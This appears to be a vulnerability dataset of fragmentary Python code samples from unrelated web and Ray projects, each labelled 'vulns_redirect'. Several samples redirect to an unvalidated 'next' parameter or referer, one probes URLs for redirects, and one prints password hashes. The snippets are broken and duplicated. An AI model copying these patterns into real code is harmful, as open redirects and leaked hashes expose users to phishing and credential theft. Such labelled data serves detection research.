            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
            csr_state_id=csr_state_logout.csr_state_id,vulns_redirect
            group_exam_ind = 0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
"            group_exam_ind=0            exam_type_name=""Challenger Exam Session"",            group_exam_ind=0",vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
            group_exam_ind=0,vulns_redirect
"        print(""--> Bookings: Timezones"")        timezone_one = theq.Timezone(            timezone_name='America/Vancouver'        )        timezone_two = theq.Timezone(            timezone_name='America/Dawson_Creek'        )        timezone_three = theq.Timezone(            timezone_name='America/Edmonton'        )        timezone_four = theq.Timezone(            timezone_name='America/Creston'        )        db.session.add(timezone_one)        db.session.add(timezone_two)        db.session.add(timezone_three)        db.session.add(timezone_four)        db.session.commit()",vulns_redirect
"    def test_hinted_login_dialog_disabled(self):        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")            'auth/login/google-oauth2/?auth_entry=login&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2',",vulns_redirect
"                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)        except (KeyError, ValueError, IndexError):            pass",vulns_redirect
"    def test_hinted_login_dialog_disabled(self):        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")            'auth/login/google-oauth2/?auth_entry=login&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2',",vulns_redirect
"                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)        except (KeyError, ValueError, IndexError):            pass",vulns_redirect
"    def test_hinted_login_dialog_disabled(self):        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")            'auth/login/google-oauth2/?auth_entry=login&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2',",vulns_redirect
"                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)        except (KeyError, ValueError, IndexError):            pass",vulns_redirect
"    def test_hinted_login_dialog_disabled(self):        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")            'auth/login/google-oauth2/?auth_entry=login&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2',",vulns_redirect
"                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)        except (KeyError, ValueError, IndexError):            pass",vulns_redirect
"    def test_hinted_login_dialog_disabled(self):        response = self.client.get(reverse('signin_user'), params, HTTP_ACCEPT=""text/html"")            'auth/login/google-oauth2/?auth_entry=login&next=%2Fcourses%2Fsomething%2F%3Ftpa_hint%3Doa2-google-oauth2',",vulns_redirect
"                        pipeline.get_login_url(provider_id, pipeline.AUTH_ENTRY_LOGIN, redirect_url=redirect_to)        except (KeyError, ValueError, IndexError):            pass",vulns_redirect
from .. import serial_redirection,vulns_redirect
"    redirect = serial_redirection.SerialRedirection(node.TTY, node.BAUDRATE)        redirect.start()        redirect.stop()",vulns_redirect
"from flask import Flask, render_template, request, redirect, url_for, sessionfrom flask_login import LoginManager, current_user, login_user, logout_user, UserMixin",vulns_redirect
"    print('auth_check_password', user.password_hash, password)",vulns_redirect
        return redirect(url_for('view_home')),vulns_redirect
"                if (r.roundplayer_set.count() % 7) == 0:                    return HttpResponseRedirect(reverse('seed_games',                                                        args=(tournament_id,                                                              r.number())))                return HttpResponseRedirect(reverse('get_seven',",vulns_redirect
    home_url = flask.url_for('main.home')    url = flask.request.args.get('next') or \        flask.request.referrer or \        home_url    if url == flask.request.url:        return home_url    return url,vulns_redirect
"                except:                    print ""[-]Error on "" + url                if r.history:                      if r.url == ""https://example.com"":                        print ""[+]""+url                        if is_closed:                            file = open(output_file,""w+"")                        is_closed = False                        file.write(url + ""\n"")                else:                    print ""[-]""+url        else:            print ""[-]Domain is invalid""",vulns_redirect
from argon2 import PasswordHasher,vulns_redirect
""""""" BaseHandler():Class that'll be used later when @tornado.web.authenticated is needed for POST requests."""""""""""" SignUpHandler():Class that handles /signup""""""	""""""	get():	Renders the Sign Up page when the user arrives at /signup. 	"""""" check_if_exists():	Uses the pymongo driver(so everything is synchronous) to check if the username exists in database	then checks if the email address also exists in the database	depending on conditions, returns None or the error message to be displayed.	""""""",vulns_redirect
"	"""""" do_insert():	Forms a document of the username, the email, and the hashed password	and using the Motor driver(asynchronously) inserts the document into database.	""""""	"""""" hash_password():	Initializes an instance of PasswordHasher from argon2, hashes the password,	verifies if the hashing happened properly, re-hashes if the verification failed,	and then returns hashed password.	""""""		ph = PasswordHasher()		except VerifyMismatchError:	"""""" post():	Sets class variables, does rudimentary checks on username and email submitted using regex	and renders signup.html with the error if the regex fails to match the submitted value.	Then checks if the submitted username and email already exist in database by calling check_if_exists 	if check_if_exists returns not None then renders signup.html with the error. 	After confirming that no errors have occured, hashes the password and then inserts it into the	MongoDB database by calling hash_password() and do_insert() respectively.	Finally, sets the secure cookie and logs in the user.	""""""",vulns_redirect
""""""" SignInHandler():Class that handles /signin""""""	"""""" get():	Renders the Sign In page when the user arrives at /signin	"""""" check_database():	Creates an instance of PasswordHasher, finds if there is any document in the database with the 	username submitted, verifies the password with the hashed password inside the database if the 	document exists, returns None or the error message.	""""""		ph = PasswordHasher()		elif(ph.verify(document_username['password'],self.password)==False):			error = ""Password is wrong, try again!""	"""""" post():	Sets the class variables and checks the database to verify if the credentials exist and	are valid, renders the Sign In page with the error if they don't.	Finally, sets the secure cookie and redirects to /postlogin.	""""""",vulns_redirect
""""""" IndexHandler():Class that handles /""""""class IndexHandler(tornado.web.RequestHandler):		self.render('index.html')"""""" PostLoginHandler():Class that handles /postlogin""""""class PostLoginHandler(tornado.web.RequestHandler):	"""""" get():	Checks if a secure_cookie exists, if it doesn't then it redirects the user to /,	else it renders /postlogin.		cookie_status = self.get_secure_cookie(""user"")		if(cookie_status==None):			self.render('index.html')			return		else:			self.render('postlogin.html')			return"""""" BootstrapModule():Class that has the bootstrap includes statements which are included in every page,except it's easier when it's made into a module.""""""class BootstrapModule(tornado.web.UIModule):		return self.render_string('modules/bootstrap_include.html')		""login_url"": ""/signin"",",vulns_redirect
"			(r'/postlogin',PostLoginHandler)		ui_modules={'bootstrap': BootstrapModule},",vulns_redirect
    if admin:      if admin.is_open:        return {'gospel_trips_available': True},vulns_redirect
"    nextlocation = request.POST.get(""next"", None)    if nextlocation is None or nextlocation == ""None"":        if request.user.role == ""SimpleUsers"":            topredir = request.localconfig.parameters.get_value(                ""default_top_redirection"")            if topredir != ""user"":                infos = exts_pool.get_extension_infos(topredir)                nextlocation = infos[""topredirection_url""]            else:                nextlocation = reverse(""core:user_index"")            nextlocation = reverse(""core:dashboard"")",vulns_redirect
"    nextlocation = request.POST.get(""next"", None)    if nextlocation is None or nextlocation == ""None"":        if request.user.role == ""SimpleUsers"":            topredir = request.localconfig.parameters.get_value(                ""default_top_redirection"")            if topredir != ""user"":                infos = exts_pool.get_extension_infos(topredir)                nextlocation = infos[""topredirection_url""]            else:                nextlocation = reverse(""core:user_index"")            nextlocation = reverse(""core:dashboard"")",vulns_redirect
"    def log_files(self):        """"""Fetch and return a dictionary of log file names to outputs.        Returns:            IP address to log file name to log file contents mappings.        """"""        relevant_files = self.redis_client.keys(""LOGFILE*"")        ip_filename_file = {}        for filename in relevant_files:            filename = decode(filename)            filename_components = filename.split("":"")            ip_addr = filename_components[1]            file = self.redis_client.lrange(filename, 0, -1)            file_str = []            for x in file:                y = decode(x)                file_str.append(y)            if ip_addr not in ip_filename_file:                ip_filename_file[ip_addr] = {}            ip_filename_file[ip_addr][filename] = file_str        return ip_filename_file",vulns_redirect
import redis,vulns_redirect
"    Note:    The driver also has an import thread, which is used only to    import custom class definitions from calls to register_custom_serializer    that happen under the hood on workers.    def __init__(self, worker, mode):        t = threading.Thread(target=self._run, name=""ray_import_thread"")        t.daemon = True        t.start()",vulns_redirect
"        with self.worker.lock:            export_keys = self.redis_client.lrange(""Exports"", 0, -1)            for key in export_keys:                num_imported += 1                self._process_key(key)            for msg in import_pubsub_client.listen():",vulns_redirect
        except redis.ConnectionError:            pass,vulns_redirect
import redisimport timefrom ray.services import get_ip_addressfrom ray.services import get_port,vulns_redirect
"        node_ip_address: The IP address of the node that the log monitor            process is running on. This will be used to determine which log            files to track.        log_files: A dictionary mapping the name of a log file to a list of            strings representing its contents.        log_file_handles: A dictionary mapping the name of a log file to a file            handle for that file.    def __init__(self,                 redis_ip_address,                 redis_port,                 node_ip_address,                 redis_password=None):        self.node_ip_address = node_ip_address        self.redis_client = redis.StrictRedis(            host=redis_ip_address, port=redis_port, password=redis_password)        self.log_files = {}        self.log_file_handles = {}        self.files_to_ignore = set()        """"""Get the most up-to-date list of log files to monitor from Redis.""""""        num_current_log_files = len(self.log_files)        new_log_filenames = self.redis_client.lrange(            ""LOG_FILENAMES:{}"".format(self.node_ip_address),            num_current_log_files, -1)        for log_filename in new_log_filenames:            logger.info(""Beginning to track file {}"".format(log_filename))            assert log_filename not in self.log_files            self.log_files[log_filename] = []    def check_log_files_and_push_updates(self):        """"""Get any changes to the log files and push updates to Redis.""""""        for log_filename in self.log_files:            if log_filename in self.log_file_handles:                new_lines = []                while True:                    current_position = (                        self.log_file_handles[log_filename].tell())                    next_line = self.log_file_handles[log_filename].readline()                    if next_line != """":                        new_lines.append(next_line)                    else:                        self.log_file_handles[log_filename].seek(                            current_position)                        break                if len(new_lines) > 0:                    self.log_files[log_filename] += new_lines                    redis_key = ""LOGFILE:{}:{}"".format(                        self.node_ip_address, ray.utils.decode(log_filename))                    self.redis_client.rpush(redis_key, *new_lines)            elif log_filename in self.files_to_ignore:                pass            else:                    self.log_file_handles[log_filename] = open(                        log_filename, ""r"")                except IOError as e:                    if e.errno == os.errno.EMFILE:                        logger.warning(                            ""Warning: Ignoring {} because there are too ""                            ""many open files."".format(log_filename))                    elif e.errno == os.errno.ENOENT:                                       ""found."".format(log_filename))                    self.files_to_ignore.add(log_filename)",vulns_redirect
            self.check_log_files_and_push_updates()            time.sleep(1),vulns_redirect
"    parser.add_argument(        ""--node-ip-address"",        required=True,        type=str,        help=""The IP address of the node this process is on."")",vulns_redirect
"    redis_ip_address = get_ip_address(args.redis_address)    redis_port = get_port(args.redis_address)        redis_ip_address,        redis_port,        args.node_ip_address,        redis_password=args.redis_password)    log_monitor.run()",vulns_redirect
"    def __init__(self,                 redis_address,                 redis_port,                 autoscaling_config,                 redis_password=None):            redis_address, redis_port, redis_password=redis_password)        self.redis = redis.StrictRedis(            host=redis_address, port=redis_port, db=0, password=redis_password)",vulns_redirect
"    redis_ip_address = get_ip_address(args.redis_address)    redis_port = get_port(args.redis_address)        redis_ip_address,        redis_port,",vulns_redirect
"        redis_client = redis.StrictRedis(            host=redis_ip_address,            port=redis_port,            password=args.redis_password)",vulns_redirect
"            self._node_ip_address,",vulns_redirect
"            plasma_store_socket_name=self._plasma_store_socket_name,            redis_password=self._ray_params.redis_password)",vulns_redirect
            redirect_output=self._ray_params.redirect_worker_output),vulns_redirect
"                 redirect_worker_output=False,",vulns_redirect
"    def __init__(self, worker):        t = threading.Thread(        t.daemon = True        t.start()",vulns_redirect
"        try:            while True:                time.sleep(1)                self.flush_profile_data()        except AttributeError:            pass        """"""Push the logged profiling data to the global control store.        By default, profiling information for a given task won't appear in the        timeline until after the task has completed. For very long-running        tasks, we may want profiling information to appear more quickly.        In such cases, this function can be called. Note that as an        alternative, we could start a thread in the background on workers that        calls this automatically.        """"""",vulns_redirect
"def record_log_files_in_redis(redis_address,                              node_ip_address,                              log_files,                              password=None):    """"""Record in Redis that a new log file has been created.    This is used so that each log monitor can check Redis and figure out which    log files it is reponsible for monitoring.    Args:        redis_address: The address of the redis server.        node_ip_address: The IP address of the node that the log file exists            on.        log_files: A list of file handles for the log files. If one of the file            handles is None, we ignore it.        password (str): The password of the redis server.    """"""    for log_file in log_files:        if log_file is not None:            redis_ip_address, redis_port = redis_address.split("":"")            redis_client = redis.StrictRedis(                host=redis_ip_address, port=redis_port, password=password)            log_file_list_key = ""LOG_FILENAMES:{}"".format(node_ip_address)            redis_client.rpush(log_file_list_key, log_file.name)",vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [redis_stdout_file, redis_stderr_file],        password=password)",vulns_redirect
"        record_log_files_in_redis(            redis_address,            node_ip_address, [redis_stdout_file, redis_stderr_file],            password=password)",vulns_redirect
"                      node_ip_address,",vulns_redirect
        node_ip_address (str): The IP address of the node that this log monitor            is running on.,vulns_redirect
"        sys.executable, ""-u"", log_monitor_filepath, ""--redis-address"",        redis_address, ""--node-ip-address"", node_ip_address",vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [stdout_file, stderr_file],        password=redis_password)",vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [stdout_file, stderr_file],        password=redis_password)",vulns_redirect
"                       plasma_store_socket_name=None,                       redis_password=None):",vulns_redirect
        redis_password (str): The password of the redis server.,vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [stdout_file, stderr_file],        password=redis_password)",vulns_redirect
"    record_log_files_in_redis(redis_address, node_ip_address,                              [stdout_file, stderr_file])",vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [stdout_file, stderr_file],        password=redis_password)",vulns_redirect
"    _default_handler = logging.StreamHandler()    logger.addHandler(_default_handler)def try_update_handler(new_stream):    global _default_handler    logger = logging.getLogger(""ray"")    if _default_handler:        new_handler = logging.StreamHandler(stream=new_stream)        new_handler.setFormatter(_default_handler.formatter)        _default_handler.close()        _default_handler = new_handler        logger.addHandler(_default_handler)",vulns_redirect
"                       thread_safe_client, setup_logger, try_update_handler)",vulns_redirect
"         redirect_worker_output=False,",vulns_redirect
"    if hasattr(worker, ""raylet_client""):        del worker.raylet_client    if hasattr(worker, ""plasma_client""):        worker.plasma_client.disconnect()",vulns_redirect
"def print_error_messages_raylet(task_error_queue):        error, t = task_error_queue.get()            time.sleep(1)",vulns_redirect
"def listen_error_messages_raylet(worker, task_error_queue):",vulns_redirect
    with worker.lock:        error_messages = global_state.error_messages(worker.task_driver_id)        for error_message in error_messages:            logger.error(error_message)        for msg in worker.error_message_pubsub_client.listen():,vulns_redirect
    except redis.ConnectionError:        pass,vulns_redirect
    worker.profiler = profiling.Profiler(worker),vulns_redirect
"    worker.redis_client = thread_safe_client(        redis.StrictRedis(            host=redis_ip_address,            port=int(redis_port),            password=redis_password))",vulns_redirect
"            sys.stdout = log_stdout_file            sys.stderr = log_stderr_file            try_update_handler(sys.stderr)            services.record_log_files_in_redis(                info[""redis_address""],                info[""node_ip_address""], [log_stdout_file, log_stderr_file],                password=redis_password)",vulns_redirect
"        plasma.connect(info[""store_socket_name""]))",vulns_redirect
"    import_thread.ImportThread(worker, mode).start()",vulns_redirect
"        listener = threading.Thread(            args=(worker, q))        printer = threading.Thread(            args=(q, ))        listener.daemon = True        listener.start()        printer.daemon = True        printer.start()",vulns_redirect
"    def log_files(self):        """"""Fetch and return a dictionary of log file names to outputs.        Returns:            IP address to log file name to log file contents mappings.        """"""        relevant_files = self.redis_client.keys(""LOGFILE*"")        ip_filename_file = {}        for filename in relevant_files:            filename = decode(filename)            filename_components = filename.split("":"")            ip_addr = filename_components[1]            file = self.redis_client.lrange(filename, 0, -1)            file_str = []            for x in file:                y = decode(x)                file_str.append(y)            if ip_addr not in ip_filename_file:                ip_filename_file[ip_addr] = {}            ip_filename_file[ip_addr][filename] = file_str        return ip_filename_file",vulns_redirect
import redis,vulns_redirect
"    Note:    The driver also has an import thread, which is used only to    import custom class definitions from calls to register_custom_serializer    that happen under the hood on workers.    def __init__(self, worker, mode):        t = threading.Thread(target=self._run, name=""ray_import_thread"")        t.daemon = True        t.start()",vulns_redirect
"        with self.worker.lock:            export_keys = self.redis_client.lrange(""Exports"", 0, -1)            for key in export_keys:                num_imported += 1                self._process_key(key)            for msg in import_pubsub_client.listen():",vulns_redirect
        except redis.ConnectionError:            pass,vulns_redirect
import redisimport timefrom ray.services import get_ip_addressfrom ray.services import get_port,vulns_redirect
"        node_ip_address: The IP address of the node that the log monitor            process is running on. This will be used to determine which log            files to track.        log_files: A dictionary mapping the name of a log file to a list of            strings representing its contents.        log_file_handles: A dictionary mapping the name of a log file to a file            handle for that file.    def __init__(self,                 redis_ip_address,                 redis_port,                 node_ip_address,                 redis_password=None):        self.node_ip_address = node_ip_address        self.redis_client = redis.StrictRedis(            host=redis_ip_address, port=redis_port, password=redis_password)        self.log_files = {}        self.log_file_handles = {}        self.files_to_ignore = set()        """"""Get the most up-to-date list of log files to monitor from Redis.""""""        num_current_log_files = len(self.log_files)        new_log_filenames = self.redis_client.lrange(            ""LOG_FILENAMES:{}"".format(self.node_ip_address),            num_current_log_files, -1)        for log_filename in new_log_filenames:            logger.info(""Beginning to track file {}"".format(log_filename))            assert log_filename not in self.log_files            self.log_files[log_filename] = []    def check_log_files_and_push_updates(self):        """"""Get any changes to the log files and push updates to Redis.""""""        for log_filename in self.log_files:            if log_filename in self.log_file_handles:                new_lines = []                while True:                    current_position = (                        self.log_file_handles[log_filename].tell())                    next_line = self.log_file_handles[log_filename].readline()                    if next_line != """":                        new_lines.append(next_line)                    else:                        self.log_file_handles[log_filename].seek(                            current_position)                        break                if len(new_lines) > 0:                    self.log_files[log_filename] += new_lines                    redis_key = ""LOGFILE:{}:{}"".format(                        self.node_ip_address, ray.utils.decode(log_filename))                    self.redis_client.rpush(redis_key, *new_lines)            elif log_filename in self.files_to_ignore:                pass            else:                    self.log_file_handles[log_filename] = open(                        log_filename, ""r"")                except IOError as e:                    if e.errno == os.errno.EMFILE:                        logger.warning(                            ""Warning: Ignoring {} because there are too ""                            ""many open files."".format(log_filename))                    elif e.errno == os.errno.ENOENT:                                       ""found."".format(log_filename))                    self.files_to_ignore.add(log_filename)",vulns_redirect
            self.check_log_files_and_push_updates()            time.sleep(1),vulns_redirect
"    parser.add_argument(        ""--node-ip-address"",        required=True,        type=str,        help=""The IP address of the node this process is on."")",vulns_redirect
"    redis_ip_address = get_ip_address(args.redis_address)    redis_port = get_port(args.redis_address)        redis_ip_address,        redis_port,        args.node_ip_address,        redis_password=args.redis_password)    log_monitor.run()",vulns_redirect
"    def __init__(self,                 redis_address,                 redis_port,                 autoscaling_config,                 redis_password=None):            redis_address, redis_port, redis_password=redis_password)        self.redis = redis.StrictRedis(            host=redis_address, port=redis_port, db=0, password=redis_password)",vulns_redirect
"    redis_ip_address = get_ip_address(args.redis_address)    redis_port = get_port(args.redis_address)        redis_ip_address,        redis_port,",vulns_redirect
"        redis_client = redis.StrictRedis(            host=redis_ip_address,            port=redis_port,            password=args.redis_password)",vulns_redirect
"            self._node_ip_address,",vulns_redirect
"            plasma_store_socket_name=self._plasma_store_socket_name,            redis_password=self._ray_params.redis_password)",vulns_redirect
            redirect_output=self._ray_params.redirect_worker_output),vulns_redirect
"                 redirect_worker_output=False,",vulns_redirect
"    def __init__(self, worker):        t = threading.Thread(        t.daemon = True        t.start()",vulns_redirect
"        try:            while True:                time.sleep(1)                self.flush_profile_data()        except AttributeError:            pass        """"""Push the logged profiling data to the global control store.        By default, profiling information for a given task won't appear in the        timeline until after the task has completed. For very long-running        tasks, we may want profiling information to appear more quickly.        In such cases, this function can be called. Note that as an        alternative, we could start a thread in the background on workers that        calls this automatically.        """"""",vulns_redirect
"def record_log_files_in_redis(redis_address,                              node_ip_address,                              log_files,                              password=None):    """"""Record in Redis that a new log file has been created.    This is used so that each log monitor can check Redis and figure out which    log files it is reponsible for monitoring.    Args:        redis_address: The address of the redis server.        node_ip_address: The IP address of the node that the log file exists            on.        log_files: A list of file handles for the log files. If one of the file            handles is None, we ignore it.        password (str): The password of the redis server.    """"""    for log_file in log_files:        if log_file is not None:            redis_ip_address, redis_port = redis_address.split("":"")            redis_client = redis.StrictRedis(                host=redis_ip_address, port=redis_port, password=password)            log_file_list_key = ""LOG_FILENAMES:{}"".format(node_ip_address)            redis_client.rpush(log_file_list_key, log_file.name)",vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [redis_stdout_file, redis_stderr_file],        password=password)",vulns_redirect
"        record_log_files_in_redis(            redis_address,            node_ip_address, [redis_stdout_file, redis_stderr_file],            password=password)",vulns_redirect
"                      node_ip_address,",vulns_redirect
        node_ip_address (str): The IP address of the node that this log monitor            is running on.,vulns_redirect
"        sys.executable, ""-u"", log_monitor_filepath, ""--redis-address"",        redis_address, ""--node-ip-address"", node_ip_address",vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [stdout_file, stderr_file],        password=redis_password)",vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [stdout_file, stderr_file],        password=redis_password)",vulns_redirect
"                       plasma_store_socket_name=None,                       redis_password=None):",vulns_redirect
        redis_password (str): The password of the redis server.,vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [stdout_file, stderr_file],        password=redis_password)",vulns_redirect
"    record_log_files_in_redis(redis_address, node_ip_address,                              [stdout_file, stderr_file])",vulns_redirect
"    record_log_files_in_redis(        redis_address,        node_ip_address, [stdout_file, stderr_file],        password=redis_password)",vulns_redirect
"    _default_handler = logging.StreamHandler()    logger.addHandler(_default_handler)def try_update_handler(new_stream):    global _default_handler    logger = logging.getLogger(""ray"")    if _default_handler:        new_handler = logging.StreamHandler(stream=new_stream)        new_handler.setFormatter(_default_handler.formatter)        _default_handler.close()        _default_handler = new_handler        logger.addHandler(_default_handler)",vulns_redirect
"                       thread_safe_client, setup_logger, try_update_handler)",vulns_redirect
"         redirect_worker_output=False,",vulns_redirect
"    if hasattr(worker, ""raylet_client""):        del worker.raylet_client    if hasattr(worker, ""plasma_client""):        worker.plasma_client.disconnect()",vulns_redirect
"def print_error_messages_raylet(task_error_queue):        error, t = task_error_queue.get()            time.sleep(1)",vulns_redirect
"def listen_error_messages_raylet(worker, task_error_queue):",vulns_redirect
    with worker.lock:        error_messages = global_state.error_messages(worker.task_driver_id)        for error_message in error_messages:            logger.error(error_message)        for msg in worker.error_message_pubsub_client.listen():,vulns_redirect
    except redis.ConnectionError:        pass,vulns_redirect
    worker.profiler = profiling.Profiler(worker),vulns_redirect
"    worker.redis_client = thread_safe_client(        redis.StrictRedis(            host=redis_ip_address,            port=int(redis_port),            password=redis_password))",vulns_redirect
"            sys.stdout = log_stdout_file            sys.stderr = log_stderr_file            try_update_handler(sys.stderr)            services.record_log_files_in_redis(                info[""redis_address""],                info[""node_ip_address""], [log_stdout_file, log_stderr_file],                password=redis_password)",vulns_redirect
"        plasma.connect(info[""store_socket_name""]))",vulns_redirect
"    import_thread.ImportThread(worker, mode).start()",vulns_redirect
"        listener = threading.Thread(            args=(worker, q))        printer = threading.Thread(            args=(q, ))        listener.daemon = True        listener.start()        printer.daemon = True        printer.start()",vulns_redirect
"from flask import Flask, g, url_for",vulns_redirect
from benwaonline.gallery import galleryfrom benwaonline.gallery.forms import images,vulns_redirect
"from flask import Blueprint, request, session, g, redirect, url_for, \     render_template, flashfrom benwaonline.models import user_datastore, User",vulns_redirect
"@auth.route('/test')def test():    if current_user.is_authenticated:        return str(current_user.username) + str(current_user.user_id)    return ""not logged in "" + str(current_user.is_authenticated)    return redirect(url_for('auth.test'))@auth.route('/login/auth')        return redirect(url_for('gallery.show_posts'))    callback_url = url_for('auth.oauthorize_callback', next=request.args.get('next'))    return twitter.authorize(callback=callback_url or request.referrer or None)        return redirect(url_for('gallery.show_posts'))        next = request.args.get('next')        return redirect(url_for('auth.test'))",vulns_redirect
"        name_exists = User.query.filter(User.username == username).all()        next = request.args.get('next')        return redirect(url_for('auth.test'))    flash('There was an issue with sign up, please try again')",vulns_redirect
"from flask import Blueprint, request, session, g, redirect, url_for, \     render_template, flash, current_app    return redirect(url_for('auth.test'))",vulns_redirect
"from flask import request, redirect, url_for, render_template, flash, g, current_app",vulns_redirect
"@gallery.route('/gallery/benwa/')def show_post_redirect():    return redirect(url_for('gallery.show_posts'))    return redirect(url_for('gallery.show_posts'))            current_app.static_folder, current_app.config['STATIC_BENWA_DIR'], fname",vulns_redirect
"    UPLOADED_BENWA_DIR = os.path.join(BASE, 'static', 'tempbenwas')",vulns_redirect
    __tablename__ = 'user',vulns_redirect
"    user_id = Column(Integer, ForeignKey('user.id'))",vulns_redirect
"    processed = Column(String(5))    user_id = Column(Integer, ForeignKey('user.id'))",vulns_redirect
"@app.route('/gconnect', methods=['POST'])",vulns_redirect
    code = request.data,vulns_redirect
"    print ""done!""",vulns_redirect
"def createUser(login_session):    newUser = User(name=login_session['username'], email=login_session[                   'email'], picture=login_session['picture'])    session.add(newUser)    session.commit()    user = session.query(User).filter_by(email=login_session['email']).one()    return user.iddef getUserInfo(user_id):    user = session.query(User).filter_by(id=user_id).one()    return userdef getUserID(email):    try:        user = session.query(User).filter_by(email=email).one()        return user.id    except:        return None",vulns_redirect
"    editedGrudget = session.query(        Grudget).filter_by(id=grudget_id).one()    if editGrudget.user_id != login_session['user_id']:        return ""<script>function myFunction() {alert('As juicy as this is, you are not authorized to edit this grudget. Please create your own grudget in order to edit.');}</script><body onload='myFunction()'>""",vulns_redirect
    if grudgetToDelete.user_id != login_session['user_id']:,vulns_redirect
"    grudget = session.query(Grudget).filter_by(id=grudget_id).one()        return render_template('publicgrudges.html', grudges=grudges, id=grudget_id,grudget=grudget,creator=creator )            newGrudge = Grudge(name=request.form['name'], description=request.form[                           'description'], processed=request.form['processed'], takeaway=request.form['takeaway'], grudget_id=grudget_id, user_id=login_session['user_id'])            return redirect(url_for('showGrudge', grudget_id=grudget_id))",vulns_redirect
    if login_session['user_id'] != grudget.user_id:,vulns_redirect
"SOCIAL_AUTH_LOGIN_REDIRECT_URL = os.environ.get('SOCIAL_AUTH_REDIRECT',                                                'http://localhost:4200')",vulns_redirect
"from apps.home.views import home_page, projects, project, project_clone",vulns_redirect
"        resp = redirect(request.GET.get('next', request.META.get('HTTP_REFERER', '/')))",vulns_redirect
"fromdef test_user_not_logged_in(client,create_user):def test_election_not_open(client,create_user):    assert ""Valget har ikke pnet enda"" in request.content.decode('utf-8')",vulns_redirect
"def test_election_is_open(client,create_user, create_election_with_positions):    election = Election.objects.create()    assert reverse('elections:vote') == request.url",vulns_redirect
"fromdef test_user_not_logged_in(client,create_user):def test_election_not_open(client,create_user):    assert ""Valget har ikke pnet enda"" in request.content.decode('utf-8')",vulns_redirect
"def test_election_is_open(client,create_user, create_election_with_positions):    election = Election.objects.create()    assert reverse('elections:vote') == request.url",vulns_redirect
"            filename, mode = newfd            self.newfd = os.open(filename, mode)",vulns_redirect
"        SetUpInputRedirect(cmd)        SetUpOutputRedirect(cmd)        SetUpAppendRedirect(cmd)    import pdb; pdb.set_trace()    pass    i = cmd.index("">"")    sys.stdout = open(cmd[i + 1], ""w"")    del cmd[i + 1]    del cmd[i]    print(""this is a test"")    import pdb; pdb.set_trace()    pass",vulns_redirect
"        fields = ['gen_cat', 'prod_fam', 'prod_type', 'description','tags',]",vulns_redirect
admin.site.register(Script),vulns_redirect
"        fields = ['gen_cat', 'prod_fam', 'prod_type', 'description','tags',]",vulns_redirect
admin.site.register(Script),vulns_redirect
"    def test_download_raw_chem_button(self):        response = self.client.get('/get_data/')        self.assertEqual(response.status_code, 200)        self.assertContains(response, 'Download Uncurated Chemicals')        rc = RawChem.objects.filter(dsstox_id__isnull=True).first()        response = self.client.get('/dl_raw_chems/')        rc_row = f'%s,%s,%s,%s\r\n' % (            rc.id, rc.raw_cas, rc.raw_chem_name, rc.rid if rc.rid else '')        rc_row = bytes(rc_row, 'utf-8')        self.assertIn(rc_row, response.content,                      'The non-curated row should appear')        rc_row = f'%s,%s,%s,%s,%s\r\n' % (rc.extracted_text.data_document.data_group.id,                                          rc.id, rc.raw_cas, rc.raw_chem_name, rc.rid if rc.rid else '')        rc_row = bytes(rc_row, 'utf-8')        self.assertIn(rc_row, response.content,                      'The data group id should be in the output')        rc = RawChem.objects.filter(dsstox_id__isnull=False).first()        rc_row = f'%s,%s,%s,%s\r\n' % (            rc.id, rc.raw_cas, rc.raw_chem_name, rc.sid if rc.sid else '')        rc_row = bytes(rc_row, 'utf-8')        self.assertNotIn(rc_row, response.content,                         'The curated row should not appear')",vulns_redirect
        5. Approve ,vulns_redirect
        1. ,vulns_redirect
